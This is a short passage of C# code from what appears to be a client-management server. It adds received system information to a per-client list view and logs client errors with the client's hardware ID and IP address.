                            Client.ClientDictionary[Data.IP_Origin].informationForm.systemInformationListView.Items.Add(item);

                        }

                    });
                }
                catch (System.Exception ex)
                {
                    MessageBox.Show(ex.ToString());
                }
            }
            else
            {
                Utilities.Log(Data.HWID + " with IP : " + Data.IP_Origin + " : Error from client : " + Data.returnError.errorDescription, Color.Red);
            }
        }
    }
}
